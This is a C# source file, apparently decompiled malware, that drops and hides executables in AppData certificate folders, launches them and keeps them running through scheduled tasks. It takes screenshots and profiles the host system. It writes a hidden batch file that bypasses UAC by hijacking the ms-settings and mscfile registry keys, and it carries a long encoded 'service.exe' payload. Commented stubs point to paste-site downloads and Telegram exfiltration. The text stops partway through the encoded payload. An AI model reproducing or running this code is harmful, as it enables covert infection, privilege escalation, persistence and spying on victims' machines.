using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

// Token: 0x02000002 RID: 2
internal class UHJvZ3JhbUFB
{
	// Token: 0x06000003 RID: 3 RVA: 0x00002057 File Offset: 0x00000257

	/*
	// Token: 0x06000005 RID: 5 RVA: 0x00002154 File Offset: 0x00000354
	[DebuggerStepThrough]
	private static Task Main()
	{
		UHJvZ3JhbUFB.<Main>d__5 <Main>d__ = new UHJvZ3JhbUFB.<Main>d__5();
		<Main>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
		<Main>d__.<>1__state = -1;
		<Main>d__.<>t__builder.Start<UHJvZ3JhbUFB.<Main>d__5>(ref <Main>d__);
		return <Main>d__.<>t__builder.Task;
	}

	// Token: 0x06000006 RID: 6 RVA: 0x00002194 File Offset: 0x00000394
	[DebuggerStepThrough]
	private static Task Rentryco()
	{
		UHJvZ3JhbUFB.<Rentryco>d__6 <Rentryco>d__ = new UHJvZ3JhbUFB.<Rentryco>d__6();
		<Rentryco>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
		<Rentryco>d__.<>1__state = -1;
		<Rentryco>d__.<>t__builder.Start<UHJvZ3JhbUFB.<Rentryco>d__6>(ref <Rentryco>d__);
		return <Rentryco>d__.<>t__builder.Task;
	}

	// Token: 0x06000007 RID: 7 RVA: 0x000021D4 File Offset: 0x000003D4
	[DebuggerStepThrough]
	private static Task Pastebin()
	{
		UHJvZ3JhbUFB.<Pastebin>d__7 <Pastebin>d__ = new UHJvZ3JhbUFB.<Pastebin>d__7();
		<Pastebin>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
		<Pastebin>d__.<>1__state = -1;
		<Pastebin>d__.<>t__builder.Start<UHJvZ3JhbUFB.<Pastebin>d__7>(ref <Pastebin>d__);
		return <Pastebin>d__.<>t__builder.Task;
	}

	// Token: 0x06000008 RID: 8 RVA: 0x00002214 File Offset: 0x00000414
	[DebuggerStepThrough]
	private static Task Textis()
	{
		UHJvZ3JhbUFB.<Textis>d__8 <Textis>d__ = new UHJvZ3JhbUFB.<Textis>d__8();
		<Textis>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
		<Textis>d__.<>1__state = -1;
		<Textis>d__.<>t__builder.Start<UHJvZ3JhbUFB.<Textis>d__8>(ref <Textis>d__);
		return <Textis>d__.<>t__builder.Task;
	}

	// Token: 0x06000009 RID: 9 RVA: 0x00002254 File Offset: 0x00000454
	[DebuggerStepThrough]
	private static Task Pastebinai()
	{
		UHJvZ3JhbUFB.<Pastebinai>d__9 <Pastebinai>d__ = new UHJvZ3JhbUFB.<Pastebinai>d__9();
		<Pastebinai>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
		<Pastebinai>d__.<>1__state = -1;
		<Pastebinai>d__.<>t__builder.Start<UHJvZ3JhbUFB.<Pastebinai>d__9>(ref <Pastebinai>d__);
		return <Pastebinai>d__.<>t__builder.Task;
	}

	// Token: 0x0600000A RID: 10 RVA: 0x00002294 File Offset: 0x00000494
	[DebuggerStepThrough]
	private static Task TextBinNET()
	{
		UHJvZ3JhbUFB.<TextBinNET>d__10 <TextBinNET>d__ = new UHJvZ3JhbUFB.<TextBinNET>d__10();
		<TextBinNET>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
		<TextBinNET>d__.<>1__state = -1;
		<TextBinNET>d__.<>t__builder.Start<UHJvZ3JhbUFB.<TextBinNET>d__10>(ref <TextBinNET>d__);
		return <TextBinNET>d__.<>t__builder.Task;
	}
	*/
	// Token: 0x0600000B RID: 11 RVA: 0x000022D4 File Offset: 0x000004D4
	private static bool IsWindows7()
	{
		return Environment.OSVersion.Version.Major == 6 && Environment.OSVersion.Version.Minor == 1;
	}

	// Token: 0x0600000C RID: 12 RVA: 0x00002318 File Offset: 0x00000518
	private static string DownloadFile(string url, string filePath)
	{
		using (WebClient webClient = new WebClient())
		{
			webClient.DownloadFile(url, filePath);
		}
		return filePath;
	}

	// Token: 0x0600000D RID: 13 RVA: 0x00002364 File Offset: 0x00000564
	private static string DownloadString(string url, int timeout = 15000)
	{
		WebRequest webRequest = WebRequest.Create(url);
		webRequest.Timeout = timeout;
		string result;
		using (WebResponse response = webRequest.GetResponse())
		{
			using (StreamReader streamReader = new StreamReader(response.GetResponseStream()))
			{
				string text = streamReader.ReadToEnd();
				result = text;
			}
		}
		return result;
	}

	// Token: 0x0600000E RID: 14 RVA: 0x000023E0 File Offset: 0x000005E0
	private static string GetZipUrl(string body)
	{
		string[] source = body.Split(new string[]
		{
			"",
			"",
			""

		}, StringSplitOptions.RemoveEmptyEntries);
		return source.FirstOrDefault((string line) => line.EndsWith(".7z", StringComparison.OrdinalIgnoreCase));
	}

	// Token: 0x0600000F RID: 15 RVA: 0x00002454 File Offset: 0x00000654
	[DebuggerStepThrough]

	/*
	private static Task<string> ExtractFiles(string zipUrl)
	{
		UHJvZ3JhbUFB.ExtractFiles <ExtractFiles>d__ = new UHJvZ3JhbUFB.<ExtractFiles>d__15();
		<ExtractFiles>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
		<ExtractFiles>d__.zipUrl = zipUrl;
		<ExtractFiles>d__.<>1__state = -1;
		<ExtractFiles>d__.<>t__builder.Start<UHJvZ3JhbUFB.<ExtractFiles>d__15>(ref <ExtractFiles>d__);
		return <ExtractFiles>d__.<>t__builder.Task;
	}*/

	// Token: 0x06000010 RID: 16 RVA: 0x00002498 File Offset: 0x00000698
	private static void MoveFiles(string extractPath)
	{
		try
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\SystemCertificates\\My\\CRLs");
			string[] files = Directory.GetFiles(extractPath, "*.exe");
			foreach (string text2 in files)
			{
				string fileName = Path.GetFileName(text2);
				string path = (fileName == "aitstatic.exe" || fileName == "ComSvcConfig.exe" ? text : Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\SystemCertificates\\My\\CTLs"));
				string destFileName = Path.Combine(path, fileName);
				File.Copy(text2, destFileName, true);
			}
			bool flag = Directory.Exists(extractPath);
			if (flag)
			{
				Directory.Delete(extractPath, true);
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000011 RID: 17 RVA: 0x00002590 File Offset: 0x00000790
	private static void DeleteTempFiles(params string[] filePaths)
	{
		try
		{
			foreach (string path in filePaths)
			{
				bool flag = File.Exists(path);
				if (flag)
				{
					File.Delete(path);
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000012 RID: 18 RVA: 0x000025F0 File Offset: 0x000007F0
	private static string DecryptWithBase64(string encryptedTextBase64, string key)
	{
		byte[] bytes = Convert.FromBase64String(encryptedTextBase64);
		string @string = Encoding.UTF8.GetString(bytes);
		char[] array = new char[@string.Length];
		for (int i = 0; i < @string.Length; i++)
		{
			char c = @string[i];
			char c2 = key[i % key.Length];
			array[i] = (char)(c - c2);
		}
		return new string(array);
	}

	/*
	// Token: 0x06000013 RID: 19 RVA: 0x00002670 File Offset: 0x00000870
	[DebuggerStepThrough]
	private static Task MainProgram()
	{
		UHJvZ3JhbUFB.< MainProgram > d__20 < MainProgram > d__ = new UHJvZ3JhbUFB.< MainProgram > d__20();
		< MainProgram > d__.<> t__builder = AsyncTaskMethodBuilder.Create();
		< MainProgram > d__.<> 1__state = -1;
		< MainProgram > d__.<> t__builder.Start < UHJvZ3JhbUFB.< MainProgram > d__20 > (ref < MainProgram > d__);
		return < MainProgram > d__.<> t__builder.Task;
	}

	// Token: 0x06000014 RID: 20 RVA: 0x000026B0 File Offset: 0x000008B0
	[DebuggerStepThrough]
	private static Task MainProgramv2()
	{
		UHJvZ3JhbUFB.< MainProgramv2 > d__21 < MainProgramv2 > d__ = new UHJvZ3JhbUFB.< MainProgramv2 > d__21();
		< MainProgramv2 > d__.<> t__builder = AsyncTaskMethodBuilder.Create();
		< MainProgramv2 > d__.<> 1__state = -1;
		< MainProgramv2 > d__.<> t__builder.Start < UHJvZ3JhbUFB.< MainProgramv2 > d__21 > (ref < MainProgramv2 > d__);
		return < MainProgramv2 > d__.<> t__builder.Task;
	}

	// Token: 0x06000015 RID: 21 RVA: 0x000026F0 File Offset: 0x000008F0
	[DebuggerStepThrough]
	private static Task MainProgramv3()
	{
		UHJvZ3JhbUFB.< MainProgramv3 > d__22 < MainProgramv3 > d__ = new UHJvZ3JhbUFB.< MainProgramv3 > d__22();
		< MainProgramv3 > d__.<> t__builder = AsyncTaskMethodBuilder.Create();
		< MainProgramv3 > d__.<> 1__state = -1;
		< MainProgramv3 > d__.<> t__builder.Start < UHJvZ3JhbUFB.< MainProgramv3 > d__22 > (ref < MainProgramv3 > d__);
		return < MainProgramv3 > d__.<> t__builder.Task;
	}

	// Token: 0x06000016 RID: 22 RVA: 0x00002730 File Offset: 0x00000930
	[DebuggerStepThrough]
	private static Task MainProgramv4()
	{
		UHJvZ3JhbUFB.< MainProgramv4 > d__23 < MainProgramv4 > d__ = new UHJvZ3JhbUFB.< MainProgramv4 > d__23();
		< MainProgramv4 > d__.<> t__builder = AsyncTaskMethodBuilder.Create();
		< MainProgramv4 > d__.<> 1__state = -1;
		< MainProgramv4 > d__.<> t__builder.Start < UHJvZ3JhbUFB.< MainProgramv4 > d__23 > (ref < MainProgramv4 > d__);
		return < MainProgramv4 > d__.<> t__builder.Task;
	}

	// Token: 0x06000017 RID: 23 RVA: 0x00002770 File Offset: 0x00000970
	[DebuggerStepThrough]
	private static Task MainProgramv5()
	{
		UHJvZ3JhbUFB.< MainProgramv5 > d__24 < MainProgramv5 > d__ = new UHJvZ3JhbUFB.< MainProgramv5 > d__24();
		< MainProgramv5 > d__.<> t__builder = AsyncTaskMethodBuilder.Create();
		< MainProgramv5 > d__.<> 1__state = -1;
		< MainProgramv5 > d__.<> t__builder.Start < UHJvZ3JhbUFB.< MainProgramv5 > d__24 > (ref < MainProgramv5 > d__);
		return < MainProgramv5 > d__.<> t__builder.Task;
	}

	// Token: 0x06000018 RID: 24 RVA: 0x000027B0 File Offset: 0x000009B0
	private static void SetAttributesRecursively(string path)
	{
		foreach (string path2 in Directory.GetFiles(path))
		{
			File.SetAttributes(path2, File.GetAttributes(path2) | FileAttributes.Hidden | FileAttributes.System);
		}
		foreach (string text in Directory.GetDirectories(path))
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(text);
			directoryInfo.Attributes |= (FileAttributes.Hidden | FileAttributes.System);
			UHJvZ3JhbUFB.SetAttributesRecursively(text);
		}
	}

	// Token: 0x06000019 RID: 25 RVA: 0x0000283C File Offset: 0x00000A3C
	[DebuggerStepThrough]
	private static Task Logger()
	{
		UHJvZ3JhbUFB.< Logger > d__32 < Logger > d__ = new UHJvZ3JhbUFB.< Logger > d__32();
		< Logger > d__.<> t__builder = AsyncTaskMethodBuilder.Create();
		< Logger > d__.<> 1__state = -1;
		< Logger > d__.<> t__builder.Start < UHJvZ3JhbUFB.< Logger > d__32 > (ref < Logger > d__);
		return < Logger > d__.<> t__builder.Task;
	}

	// Token: 0x0600001A RID: 26 RVA: 0x0000287C File Offset: 0x00000A7C
	[DebuggerStepThrough]
	private static Task<string> GetIPAddressAsync()
	{
		UHJvZ3JhbUFB.< GetIPAddressAsync > d__33 < GetIPAddressAsync > d__ = new UHJvZ3JhbUFB.< GetIPAddressAsync > d__33();
		< GetIPAddressAsync > d__.<> t__builder = AsyncTaskMethodBuilder<string>.Create();
		< GetIPAddressAsync > d__.<> 1__state = -1;
		< GetIPAddressAsync > d__.<> t__builder.Start < UHJvZ3JhbUFB.< GetIPAddressAsync > d__33 > (ref < GetIPAddressAsync > d__);
		return < GetIPAddressAsync > d__.<> t__builder.Task;
	}

	// Token: 0x0600001B RID: 27 RVA: 0x000028BC File Offset: 0x00000ABC
	[DebuggerStepThrough]
	private static Task<string> GetWindowsVersionName()
	{
		UHJvZ3JhbUFB.< GetWindowsVersionName > d__34 < GetWindowsVersionName > d__ = new UHJvZ3JhbUFB.< GetWindowsVersionName > d__34();
		< GetWindowsVersionName > d__.<> t__builder = AsyncTaskMethodBuilder<string>.Create();
		< GetWindowsVersionName > d__.<> 1__state = -1;
		< GetWindowsVersionName > d__.<> t__builder.Start < UHJvZ3JhbUFB.< GetWindowsVersionName > d__34 > (ref < GetWindowsVersionName > d__);
		return < GetWindowsVersionName > d__.<> t__builder.Task;
	}

	// Token: 0x0600001C RID: 28 RVA: 0x000028FC File Offset: 0x00000AFC
	[DebuggerStepThrough]
	private static Task<string> GetBitVersion()
	{
		UHJvZ3JhbUFB.< GetBitVersion > d__35 < GetBitVersion > d__ = new UHJvZ3JhbUFB.< GetBitVersion > d__35();
		< GetBitVersion > d__.<> t__builder = AsyncTaskMethodBuilder<string>.Create();
		< GetBitVersion > d__.<> 1__state = -1;
		< GetBitVersion > d__.<> t__builder.Start < UHJvZ3JhbUFB.< GetBitVersion > d__35 > (ref < GetBitVersion > d__);
		return < GetBitVersion > d__.<> t__builder.Task;
	}

	// Token: 0x0600001D RID: 29 RVA: 0x0000293C File Offset: 0x00000B3C
	[DebuggerStepThrough]
	public static Task<string> GetAntivirus()
	{
		UHJvZ3JhbUFB.< GetAntivirus > d__36 < GetAntivirus > d__ = new UHJvZ3JhbUFB.< GetAntivirus > d__36();
		< GetAntivirus > d__.<> t__builder = AsyncTaskMethodBuilder<string>.Create();
		< GetAntivirus > d__.<> 1__state = -1;
		< GetAntivirus > d__.<> t__builder.Start < UHJvZ3JhbUFB.< GetAntivirus > d__36 > (ref < GetAntivirus > d__);
		return < GetAntivirus > d__.<> t__builder.Task;
	}

	// Token: 0x0600001E RID: 30 RVA: 0x0000297C File Offset: 0x00000B7C
	private static string GetCPUInfo()
	{
		string text = Decoder.Decode("xQlp5ekoqrg=");
		using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(Decoder.Decode("HcvE5z3V1kO3H6wOuNi6wNv/M93ssdc+By7MF9xa0e0=")))
		{
			foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
			{
				ManagementObject managementObject = (ManagementObject)managementBaseObject;
				text += string.Format(Decoder.Decode("CBmUho/GHSihMVlcRbx7UsUJaeXpKKq4"), managementObject[Decoder.Decode("TDFu+l36BdY=")], managementObject[Decoder.Decode("aRrpO1N7E9BNPJpXkBXxkQ==")]);
			}
		}
		return text;
	}

	// Token: 0x0600001F RID: 31 RVA: 0x00002A54 File Offset: 0x00000C54
	[DebuggerStepThrough]
	public static Task<string> GetGpuName()
	{
		UHJvZ3JhbUFB.< GetGpuName > d__38 < GetGpuName > d__ = new UHJvZ3JhbUFB.< GetGpuName > d__38();
		< GetGpuName > d__.<> t__builder = AsyncTaskMethodBuilder<string>.Create();
		< GetGpuName > d__.<> 1__state = -1;
		< GetGpuName > d__.<> t__builder.Start < UHJvZ3JhbUFB.< GetGpuName > d__38 > (ref < GetGpuName > d__);
		return < GetGpuName > d__.<> t__builder.Task;
	}

	// Token: 0x06000020 RID: 32 RVA: 0x00002A94 File Offset: 0x00000C94
	[DebuggerStepThrough]
	public static Task<string> GetRamAmount()
	{
		UHJvZ3JhbUFB.< GetRamAmount > d__39 < GetRamAmount > d__ = new UHJvZ3JhbUFB.< GetRamAmount > d__39();
		< GetRamAmount > d__.<> t__builder = AsyncTaskMethodBuilder<string>.Create();
		< GetRamAmount > d__.<> 1__state = -1;
		< GetRamAmount > d__.<> t__builder.Start < UHJvZ3JhbUFB.< GetRamAmount > d__39 > (ref < GetRamAmount > d__);
		return < GetRamAmount > d__.<> t__builder.Task;
	}

	// Token: 0x06000021 RID: 33 RVA: 0x00002AD4 File Offset: 0x00000CD4
	[DebuggerStepThrough]

	public static Task<string> GetBattery()
	{
		UHJvZ3JhbUFB.< GetBattery > d__40 < GetBattery > d__ = new UHJvZ3JhbUFB.< GetBattery > d__40();
		< GetBattery > d__.<> t__builder = AsyncTaskMethodBuilder<string>.Create();
		< GetBattery > d__.<> 1__state = -1;
		< GetBattery > d__.<> t__builder.Start < UHJvZ3JhbUFB.< GetBattery > d__40 > (ref < GetBattery > d__);
		return < GetBattery > d__.<> t__builder.Task;
	}

	// Token: 0x06000022 RID: 34 RVA: 0x00002B14 File Offset: 0x00000D14
	public static string ScreenMetrics()
	{
		Rectangle bounds = Screen.GetBounds(Point.Empty);
		int width = bounds.Width;
		int height = bounds.Height;
		return width.ToString() + Decoder.Decode("uboIlConOJg=") + height.ToString();
	}

	// Token: 0x06000023 RID: 35 RVA: 0x00002B64 File Offset: 0x00000D64
	public static byte[] TakeScreenshot()
	{
		byte[] result;
		using (Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
		{
			using (Graphics graphics = Graphics.FromImage(bitmap))
			{
				graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, bitmap.Size, CopyPixelOperation.SourceCopy);
				using (MemoryStream memoryStream = new MemoryStream())
				{
					bitmap.Save(memoryStream, ImageFormat.Png);
					result = memoryStream.ToArray();
				}
			}
		}
		return result;
	}

	// Token: 0x06000024 RID: 36 RVA: 0x00002C54 File Offset: 0x00000E54
	[DebuggerStepThrough]

	/*
	private static Task SendMessageAsync(string token, long chatId, string message, byte[] screenshot)
	{
		UHJvZ3JhbUFB.<SendMessageAsync>d__43 <SendMessageAsync>d__ = new UHJvZ3JhbUFB.<SendMessageAsync>d__43();
		<SendMessageAsync>d__.<>t__builder = AsyncTaskMethodBuilder.Create();
		<SendMessageAsync>d__.token = token;
		<SendMessageAsync>d__.chatId = chatId;
		<SendMessageAsync>d__.message = message;
		<SendMessageAsync>d__.screenshot = screenshot;
		<SendMessageAsync>d__.<>1__state = -1;
		<SendMessageAsync>d__.<>t__builder.Start<UHJvZ3JhbUFB.<SendMessageAsync>d__43>(ref <SendMessageAsync>d__);
		return <SendMessageAsync>d__.<>t__builder.Task;
	}
	*/

	// Token: 0x06000025 RID: 37 RVA: 0x00002CB0 File Offset: 0x00000EB0
	private static void StartProcess()
	{
		string directoryPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\SystemCertificates\\My\\CRLs");
		string directoryPath2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft\\SystemCertificates\\My\\CTLs");
		UHJvZ3JhbUFB.ProcessFilesDelay(directoryPath, 5000);
		UHJvZ3JhbUFB.ProcessFilesDelay(directoryPath2, 5000);
	}

	// Token: 0x06000026 RID: 38 RVA: 0x00002D04 File Offset: 0x00000F04
	private static void ProcessFilesDelay(string directoryPath, int delayMilliseconds)
	{
		bool flag = Directory.Exists(directoryPath);
		if (flag)
		{
			string[] files = Directory.GetFiles(directoryPath, "*.exe");
			foreach (string fileName in files)
			{
				try
				{
					Process.Start(fileName);
					Thread.Sleep(delayMilliseconds);
				}
				catch
				{
				}
			}
		}
	}

	// Token: 0x06000027 RID: 39 RVA: 0x00002D80 File Offset: 0x00000F80
	private static void AddFile()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string filePath = Path.Combine(folderPath, Decoder.Decode("X4N9hG2EEShRZCiVsXi1B2STBtAxXRIpTHv84uG1c/4gw2RT/m/44k0LyCavpuJFw7Bg+fJ5rmg=")); //Microsoft\SystemCertificates\My\CRLs\aitstatic.exe
		string filePath2 = Path.Combine(folderPath, Decoder.Decode("X4N9hG2EEShRZCiVsXi1B2STBtAxXRIpTHv84uG1c/7cDkfMdjbYC5NUVJQ7RfNHglEerpA3yII=")); //Microsoft\SystemCertificates\My\CRLs\ComSvcConfig.exe
		string filePath3 = Path.Combine(folderPath, Decoder.Decode("X4N9hG2EEShRZCiVsXi1B2STBtAxXRIpTHv84uG1c/72P9UxIQIyjHo8nA610HNt5IdW36tlMbgbLTdtacn2g+SBfD7+up96")); //Microsoft\SystemCertificates\My\CTLs\MicrosoftCertificateServices.exe
		UHJvZ3JhbUFB.AddFileST(filePath);
		UHJvZ3JhbUFB.AddFileST(filePath2);
		UHJvZ3JhbUFB.AddFileST(filePath3);
	}

	// Token: 0x06000028 RID: 40 RVA: 0x00002DE0 File Offset: 0x00000FE0
	private static void AddFileST(string filePath)
	{
		bool flag = File.Exists(filePath);
		if (flag)
		{
			string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(filePath);
			string arguments = string.Concat(new string[]
			{
				"/create /tn \"",
				fileNameWithoutExtension,
				"\" /tr \"",
				filePath,
				"\" /st 00:00 /du 9999:59 /sc once /ri 60 /f"
			});
			UHJvZ3JhbUFB.RunCommand("schtasks", arguments);
		}
	}

	// Token: 0x06000029 RID: 41 RVA: 0x00002E50 File Offset: 0x00001050
	private static void RunCommand(string command, string arguments)
	{
		try
		{
			ProcessStartInfo startInfo = new ProcessStartInfo
			{
				FileName = command,
				Arguments = arguments,
				UseShellExecute = false,
				CreateNoWindow = true
			};
			using (Process process = Process.Start(startInfo))
			{
				process.WaitForExit();
			}
		}
		catch
		{
		}
	}



	private static void DisableUAC()
	{
		string path = "C:\\Users\\Public\\Videos\\b.bat";
		string contents = "@echo off\r\nset PAYLOAD=C:\\Users\\Public\\Videos\\Service.exe\r\n\r\n\r\nnet session >nul 2>&1 || goto :label\r\n%PAYLOAD% \r\nexit /b 2\r\n\r\n\r\n:label\r\nwhoami /groups|findstr /i \"\\<S-1-5-32-544\\>\" >nul 2>&1\r\nif ERRORLEVEL 1 exit /b 1\r\n\r\n\r\nfor /f \"tokens=4-5 delims=. \" %%i in ('ver') do set WIN_VER=%%i.%%j\r\n\r\n\r\n\r\nset key=\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\"\r\nfor /f \"skip=2 tokens=3\" %%U in ('REG QUERY %key% /v ConsentPromptBehaviorAdmin') do set /a \"UAC=%%U\"\r\n\r\n\r\nif %UAC% equ 2 exit /b 1\r\nif %UAC% equ 5 (\r\n    for %%V in (6.1 6.2 6.3) do if \"%WIN_VER%\" == \"%%V\" call :exploit mscfile CompMgmtLauncher.exe %PAYLOAD%\r\n    if \"%WIN_VER%\" == \"10.0\" call :exploit ms-settings ComputerDefaults.exe %PAYLOAD%\r\n)>nul 2>&1\r\nif %UAC% equ 0 powershell -c Start-Process \"%PAYLOAD%\" -Verb runas\r\n\r\nexit /b 0\r\n\r\n:exploit <key> <trigger> <payload>\r\nset regPath=\"HKCU\\Software\\Classes\\%1\\shell\\open\\command\"\r\nreg add %regPath% /d \"%~3\" /f\r\nreg add %regPath% /v DelegateExecute /f\r\n%~2\r\nreg delete \"HKCU\\Software\\Classes\\%1\" /f\r\nexit /b";
		try
		{
			File.WriteAllText(path, contents);
			File.SetAttributes(path, FileAttributes.Hidden | FileAttributes.System);
		}
		catch
		{
		}
		string path2 = "C:\\Users\\Public\\Videos\\b.vbs";
		string contents2 = "CreateObject(\"WScript.Shell\").Run \"C:\\Users\\Public\\Videos\\b.bat\", 0, False";

		try
		{
			File.WriteAllText(path2, contents2);
			File.SetAttributes(path2, FileAttributes.Hidden | FileAttributes.System);
		}
		catch
		{
		}
		//service.exe
		string s = Decoder.Decode("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